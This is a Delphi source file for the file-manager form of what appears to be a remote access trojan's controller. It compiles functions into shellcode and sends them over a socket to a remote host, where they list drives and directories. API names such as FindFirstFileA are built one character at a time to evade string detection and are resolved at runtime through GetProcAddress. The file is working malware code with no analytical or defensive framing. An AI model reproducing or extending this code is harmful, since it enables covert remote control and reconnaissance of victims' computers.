unit untFilemanager;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, StdCtrls, untCommands;

type
  TForm2 = class(TForm)
    edtPath: TEdit;
    ListView1: TListView;
    ComboBox1: TComboBoxEx;
    procedure ComboBox1Change(Sender: TObject);
    procedure ListView1DblClick(Sender: TObject);
  private
    { Private declarations }
  public
    mySocket:Cardinal;
    procedure SetForm(mSocket:Cardinal);
    { Public declarations }
  end;

var
  Form2: TForm2;

implementation
uses
  untUtils;

{$R *.dfm}
procedure pListFiles(ptrData:Pointer; dwLen:Integer; ptrAPIBlock:PAPIBlock); stdcall;
var
  hFindHandle: THandle;
  SearchRec: TWIN32FindDataA;
  szDirectory: Array[0..MAX_PATH] Of Char;
  szFileInfo: Array[0..299] Of Char;
  lpszSendBuffer: PChar;
  iFullLen, iStrLen: Integer;
  i64DiskSize: Int64;
  strlstrcatA:Array[0..8] of Char;
  strlstrlenA:Array[0..8] of Char;
  strlstrcpynA:Array[0..9] of Char;
  strGetDiskFreeSpaceExA:Array[0..19] of Char;
  strFindFirstFileA:Array[0..14] of Char;
  strFindNextFileA:Array[0..13] of Char;
  strFindClose:Array[0..12] of Char;
  strBackslash:Array[0..1] of Char;
  strPoint:Array[0..1] of Char;
  strDelimiter:Array[0..1] of Char;
  strPather:Array[0..3] of Char;
  plstrcatA:function(lpString1, lpString2: PAnsiChar): PAnsiChar; stdcall;
  plstrlenA:function(lpString: PChar): Integer; stdcall;
  pGetDiskFreeSpaceExA:function(lpDirectoryName: PAnsiChar; var lpFreeBytesAvailableToCaller, lpTotalNumberOfBytes; lpTotalNumberOfFreeBytes: PLargeInteger): BOOL; stdcall;
  plstrcpynA: function(lpString1, lpString2: PChar; iMaxLength: Integer): PChar; stdcall;
  pFindFirstFileA: function(lpFileName: PAnsiChar; var lpFindFileData: TWIN32FindDataA): THandle; stdcall;
  pFindNextFileA: function(hFindFile: THandle; var lpFindFileData: TWIN32FindDataA): BOOL; stdcall;
  pFindClose: function(hFindFile: THandle): BOOL; stdcall;
begin
  strDelimiter[0] := '|';
  strDelimiter[1] := #0;

  strPoint[0] := '.';
  strPoint[1] := #0;

  strPather[0] := '*';
  strPather[1] := '.';
  strPather[2] := '*';
  strPather[3] := #0;

  strBackslash[0] := '\';
  strBackslash[1] := #0;

  strFindClose[0] := 'F';
  strFindClose[1] := 'i';
  strFindClose[2] := 'n';
  strFindClose[3] := 'd';
  strFindClose[4] := 'C';
  strFindClose[5] := 'l';
  strFindClose[6] := 'o';
  strFindClose[7] := 's';
  strFindClose[8] := 'e';
  strFindClose[9] := #0;

  strFindNextFileA[0] := 'F';
  strFindNextFileA[1] := 'i';
  strFindNextFileA[2] := 'n';
  strFindNextFileA[3] := 'd';
  strFindNextFileA[4] := 'N';
  strFindNextFileA[5] := 'e';
  strFindNextFileA[6] := 'x';
  strFindNextFileA[7] := 't';
  strFindNextFileA[8] := 'F';
  strFindNextFileA[9] := 'i';
  strFindNextFileA[10] := 'l';
  strFindNextFileA[11] := 'e';
  strFindNextFileA[12] := 'A';
  strFindNextFileA[13] := #0;

  strFindFirstFileA[0] := 'F';
  strFindFirstFileA[1] := 'i';
  strFindFirstFileA[2] := 'n';
  strFindFirstFileA[3] := 'd';
  strFindFirstFileA[4] := 'F';
  strFindFirstFileA[5] := 'i';
  strFindFirstFileA[6] := 'r';
  strFindFirstFileA[7] := 's';
  strFindFirstFileA[8] := 't';
  strFindFirstFileA[9] := 'F';
  strFindFirstFileA[10] := 'i';
  strFindFirstFileA[11] := 'l';
  strFindFirstFileA[12] := 'e';
  strFindFirstFileA[13] := 'A';
  strFindFirstFileA[14] := #0;

  strGetDiskFreeSpaceExA[0] := 'G';
  strGetDiskFreeSpaceExA[1] := 'e';
  strGetDiskFreeSpaceExA[2] := 't';
  strGetDiskFreeSpaceExA[3] := 'D';
  strGetDiskFreeSpaceExA[4] := 'i';
  strGetDiskFreeSpaceExA[5] := 's';
  strGetDiskFreeSpaceExA[6] := 'k';
  strGetDiskFreeSpaceExA[7] := 'F';
  strGetDiskFreeSpaceExA[8] := 'r';
  strGetDiskFreeSpaceExA[9] := 'e';
  strGetDiskFreeSpaceExA[10] := 'e';
  strGetDiskFreeSpaceExA[11] := 'S';
  strGetDiskFreeSpaceExA[12] := 'p';
  strGetDiskFreeSpaceExA[13] := 'a';
  strGetDiskFreeSpaceExA[14] := 'c';
  strGetDiskFreeSpaceExA[15] := 'e';
  strGetDiskFreeSpaceExA[16] := 'E';
  strGetDiskFreeSpaceExA[17] := 'x';
  strGetDiskFreeSpaceExA[18] := 'A';
  strGetDiskFreeSpaceExA[19] := #0;

  strlstrcpynA[0] := 'l';
  strlstrcpynA[1] := 's';
  strlstrcpynA[2] := 't';
  strlstrcpynA[3] := 'r';
  strlstrcpynA[4] := 'c';
  strlstrcpynA[5] := 'p';
  strlstrcpynA[6] := 'y';
  strlstrcpynA[7] := 'n';
  strlstrcpynA[8] := 'A';
  strlstrcpynA[9] := #0;

  strlstrlenA[0] := 'l';
  strlstrlenA[1] := 's';
  strlstrlenA[2] := 't';
  strlstrlenA[3] := 'r';
  strlstrlenA[4] := 'l';
  strlstrlenA[5] := 'e';
  strlstrlenA[6] := 'n';
  strlstrlenA[7] := 'A';
  strlstrlenA[8] := #0;

  strlstrcatA[0] := 'l';
  strlstrcatA[1] := 's';
  strlstrcatA[2] := 't';
  strlstrcatA[3] := 'r';
  strlstrcatA[4] := 'c';
  strlstrcatA[5] := 'a';
  strlstrcatA[6] := 't';
  strlstrcatA[7] := 'A';
  strlstrcatA[8] := #0;
  @plstrcatA := ptrAPIBlock^.pGetProcAddress(ptrAPIBlock^.hKernelHandle, @strlstrcatA[0]);
  @plstrlenA := ptrAPIBlock^.pGetProcAddress(ptrAPIBlock^.hKernelHandle, @strlstrlenA[0]);
  @pGetDiskFreeSpaceExA := ptrAPIBlock^.pGetProcAddress(ptrAPIBlock^.hKernelHandle, @strGetDiskFreeSpaceExA[0]);
  @plstrcpynA := ptrAPIBlock^.pGetProcAddress(ptrAPIBlock^.hKernelHandle, @strlstrcpynA[0]);
  @pFindFirstFileA := ptrAPIBlock^.pGetProcAddress(ptrAPIBlock^.hKernelHandle, @strFindFirstFileA[0]);
  @pFindNextFileA := ptrAPIBlock^.pGetProcAddress(ptrAPIBlock^.hKernelHandle, @strFindNextFileA[0]);
  @pFindClose := ptrAPIBlock^.pGetProcAddress(ptrAPIBlock^.hKernelHandle, @strFindClose[0]);

  iFullLen := 0;
  ptrAPIBlock^.pSendBuffer(ptrAPIBlock^.hSocket, CMD_LIST_DIR_START, nil, 1);
  if (plstrlenA(ptrData) = 3) then
  begin
    if Not pGetDiskFreeSpaceExA(ptrData, i64DiskSize, i64DiskSize, nil) then
    begin
      ptrAPIBlock^.pZeroMemory(@szDirectory, SizeOf(szDirectory));
      plstrcatA(szDirectory, '21');
      ptrAPIBlock^.pSendBuffer(ptrAPIBlock^.hSocket, CMD_LIST_DIRERROR, @szDirectory[0] , plstrlenA(@szDirectory[0]) + 1);
      Exit;
    end;
  end;
  plstrcpynA(szDirectory, ptrData, SizeOf(szDirectory));
  if (szDirectory[plstrlenA(szDirectory) - 1] <> strBackslash[0]) then
    plstrcatA(szDirectory, @strBackslash[0]);
  plstrcatA(szDirectory, @strPather[0]);
  
  lpszSendBuffer := ptrAPIBlock^.pGetMemory(4096);
  if (lpszSendBuffer <> nil) then
  begin
    hFindHandle := pFindFirstFileA(szDirectory, SearchRec);
    if (hFindHandle <> INVALID_HANDLE_VALUE) then
    begin
      repeat
        if (plstrlenA(SearchRec.cFileName) = 1) and (SearchRec.cFileName[0] = strPoint[0]) then Continue;
        ptrAPIBlock^.pZeroMemory(@szFileInfo, SizeOf(szFileInfo));
        if ((SearchRec.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY) <> 0) then
        begin
          plstrcpynA(szFileInfo, SearchRec.cFileName,300);
          plstrcatA(szFileInfo,@strDelimiter[0]);
          iStrLen := plstrlenA(szFileInfo);
          //iStrLen := ptrAPIBlock^.pwsprintfA(szFileInfo, '%s*D|', SearchRec.cFileName);
        end else
        begin
          plstrcpynA(szFileInfo, SearchRec.cFileName,300);
          plstrcatA(szFileInfo,@strDelimiter[0]);
          iStrLen := plstrlenA(szFileInfo);
          //iStrLen := wsprintfA(szFileInfo, '%s*%d|',SearchRec.cFileName, SearchRec.nFileSizeLow);
        end;
        plstrcatA(lpszSendBuffer, szFileInfo);

        iFullLen := iFullLen + iStrLen;
        if (iFullLen > 1800) then
        begin
          ptrAPIBlock^.pSendBuffer(ptrAPIBlock^.hSocket, CMD_LIST_DIR_WRITE, @lpszSendBuffer[0], iFullLen  + 1);
          iFullLen := 0;
          ptrAPIBlock^.pZeroMemory(lpszSendBuffer, 4096);
        end;
      until (Not pFindNextFileA(hFindHandle, SearchRec));
      if (iFullLen <> 0) then
      begin
        ptrAPIBlock^.pSendBuffer(ptrAPIBlock^.hSocket, CMD_LIST_DIR_WRITE, @lpszSendBuffer[0],  iFullLen + 1);
        ptrAPIBlock^.pZeroMemory(lpszSendBuffer, 4096);
      end;
      pFindClose(hFindHandle);
    end else
    begin
      ptrAPIBlock^.pZeroMemory(@szDirectory, SizeOf(szDirectory));
      plstrcatA(szDirectory, '123');
      ptrAPIBlock^.pSendBuffer(ptrAPIBlock^.hSocket, CMD_LIST_DIRERROR, @szDirectory[0],  plstrlenA(szDirectory) + 1);
      ptrAPIBlock^.pFreeMemory(lpszSendBuffer);
      Exit;
    end;
    ptrAPIBlock^.pFreeMemory(lpszSendBuffer);
  end;
  ptrAPIBlock^.pSendBuffer(ptrAPIBlock^.hSocket, CMD_LIST_DIRFINISHED, nil, 1);
end;
procedure pListFiles_END(); begin end;

procedure pListDrives(ptrData:Pointer; dwLen:Integer; ptrAPIBlock:PAPIBlock); stdcall;
var
  lpszDrive: PChar;
  szDriveListBuffer: Array[0..1023] Of Char;
  szBuffer: Array[0..MAX_PATH] Of Char;
  szDriveInfo: Array[0..15] Of Char;
  iCount, iLoop, iType: Integer;
  strGetLogicalDriveStringsA:Array[0..23] of Char;
  strGetDriveTypeA:Array[0..13] of Char;
  strlstrcatA:Array[0..8] of Char;
  strlstrlenA:Array[0..8] of Char;
  strPattern:Array[0..1] of Char;
  pGetLogicalDriveStringsA:function(nBufferLength: DWORD; lpBuffer: PAnsiChar): DWORD; stdcall;
  pGetDriveTypeA:function(lpRootPathName: PChar): UINT; stdcall;
  plstrcatA:function(lpString1, lpString2: PAnsiChar): PAnsiChar; stdcall;
  plstrlenA:function(lpString: PChar): Integer; stdcall;
begin
  strlstrlenA[0] := 'l';
  strlstrlenA[1] := 's';
  strlstrlenA[2] := 't';
  strlstrlenA[3] := 'r';
  strlstrlenA[4] := 'l';
  strlstrlenA[5] := 'e';
  strlstrlenA[6] := 'n';
  strlstrlenA[7] := 'A';
  strlstrlenA[8] := #0;

  strlstrcatA[0] := 'l';
  strlstrcatA[1] := 's';
  strlstrcatA[2] := 't';
  strlstrcatA[3] := 'r';
  strlstrcatA[4] := 'c';
  strlstrcatA[5] := 'a';
  strlstrcatA[6] := 't';
  strlstrcatA[7] := 'A';
  strlstrcatA[8] := #0;

  strGetLogicalDriveStringsA[0] := 'G';
  strGetLogicalDriveStringsA[1] := 'e';
  strGetLogicalDriveStringsA[2] := 't';
  strGetLogicalDriveStringsA[3] := 'L';
  strGetLogicalDriveStringsA[4] := 'o';
  strGetLogicalDriveStringsA[5] := 'g';
  strGetLogicalDriveStringsA[6] := 'i';
  strGetLogicalDriveStringsA[7] := 'c';
  strGetLogicalDriveStringsA[8] := 'a';
  strGetLogicalDriveStringsA[9] := 'l';
  strGetLogicalDriveStringsA[10] := 'D';
  strGetLogicalDriveStringsA[11] := 'r';
  strGetLogicalDriveStringsA[12] := 'i';
  strGetLogicalDriveStringsA[13] := 'v';
  strGetLogicalDriveStringsA[14] := 'e';
  strGetLogicalDriveStringsA[15] := 'S';
  strGetLogicalDriveStringsA[16] := 't';
  strGetLogicalDriveStringsA[17] := 'r';
  strGetLogicalDriveStringsA[18] := 'i';
  strGetLogicalDriveStringsA[19] := 'n';
  strGetLogicalDriveStringsA[20] := 'g';
  strGetLogicalDriveStringsA[21] := 's';
  strGetLogicalDriveStringsA[22] := 'A';
  strGetLogicalDriveStringsA[23] := #0;

  strGetDriveTypeA[0] := 'G';
  strGetDriveTypeA[1] := 'e';
  strGetDriveTypeA[2] := 't';
  strGetDriveTypeA[3] := 'D';
  strGetDriveTypeA[4] := 'r';
  strGetDriveTypeA[5] := 'i';
  strGetDriveTypeA[6] := 'v';
  strGetDriveTypeA[7] := 'e';
  strGetDriveTypeA[8] := 'T';
  strGetDriveTypeA[9] := 'y';
  strGetDriveTypeA[10] := 'p';
  strGetDriveTypeA[11] := 'e';
  strGetDriveTypeA[12] := 'A';
  strGetDriveTypeA[13] := #0;

  strPattern[0] := '|';
  strPattern[1] := #0;

  @pGetLogicalDriveStringsA := ptrAPIBlock^.pGetProcAddress(ptrAPIBlock^.hKernelHandle, @strGetLogicalDriveStringsA[0]);
  @pGetDriveTypeA := ptrAPIBlock^.pGetProcAddress(ptrAPIBlock^.hKernelHandle, @strGetDriveTypeA[0]);
  @plstrcatA := ptrAPIBlock^.pGetProcAddress(ptrAPIBlock^.hKernelHandle, @strlstrcatA[0]);
  @plstrlenA := ptrAPIBlock^.pGetProcAddress(ptrAPIBlock^.hKernelHandle, @strlstrlenA[0]);
  ptrAPIBlock^.pZeroMemory(@szDriveListBuffer[0], SizeOf(szDriveListBuffer));
  ptrAPIBlock^.pZeroMemory(@szDriveInfo[0], SizeOf(szDriveInfo));
  iCount := pGetLogicalDriveStringsA(MAX_PATH, szBuffer) div 4;
  for iLoop := 0 to iCount - 1 do
  begin
    lpszDrive := PChar(@szBuffer[iLoop * 4]);

    case pGetDriveTypeA(lpszDrive) of
      DRIVE_FIXED:      iType := 1;
      DRIVE_CDROM:      iType := 2;
      DRIVE_REMOVABLE:  iType := 3;
    else
      iType := 1;
    end;
    plstrcatA(szDriveListBuffer, @lpszDrive[0]);
    plstrcatA(szDriveListBuffer, @strPattern);
  end;
  ptrAPIBlock^.pSendBuffer(ptrAPIBlock^.hSocket, CMD_LIST_DRIVE, @szDriveListBuffer[0], plstrlenA(@szDriveListBuffer[0])+ 1);
end;
procedure pListDrives_END();begin end;

procedure TForm2.SetForm(mSocket:Cardinal);
var
  pFunction:Pointer;
  dwFunction:Cardinal;
begin
  mySocket := mSocket;
  pFunction := prepShellCodeWithParams(@pListDrives, nil, (DWORD(@pListDrives_END) - DWORD(@pListDrives)), 0,dwFunction);
  if pFunction <> nil then
  begin
    SendBuffer(mySocket, 0, pFunction, dwFunction+1);
    FreeMem(pFunction);
  end;
end;

procedure TForm2.ComboBox1Change(Sender: TObject);
var
  strDrive:String;
  pFunction:Pointer;
  dwFunction:Cardinal;
begin
  if ComboBox1.ItemsEx.Count = 0 then
    exit;
  strDrive := ComboBox1.ItemsEx.Items[ComboBox1.ItemIndex].Caption;
  if strDrive <> '' then
  begin
    strDrive := Copy(strDrive,1,3);
    if Length(strDrive) = 3 then
    begin
      edtPath.Text := strDrive;
      pFunction := prepShellCodeWithParams(@pListFiles, @strDrive[1], (DWORD(@pListFiles_END) - DWORD(@pListFiles)), Length(strDrive) + 1,dwFunction);
      if pFunction <> nil then
      begin
        SendBuffer(mySocket, 0, pFunction, dwFunction+1);
        FreeMem(pFunction);
      end;
    end;
  end;
end;

procedure TForm2.ListView1DblClick(Sender: TObject);
var
  pFunction:Pointer;
  dwFunction:Cardinal;
  strDrive:String;
begin
  if ListView1.Selected <> nil then
  begin
    if ListView1.Selected.Caption <> '..' then
    begin
      edtPath.Text := edtPath.Text + ListView1.Selected.Caption + '\';
      strDrive := edtPath.Text;
      pFunction := prepShellCodeWithParams(@pListFiles, @strDrive[1], (DWORD(@pListFiles_END) - DWORD(@pListFiles)), Length(strDrive) + 1,dwFunction);
      if pFunction <> nil then
      begin
        SendBuffer(mySocket, 0, pFunction, dwFunction+1);
        FreeMem(pFunction);
      end;
      
    end;
  end;
end;

end.
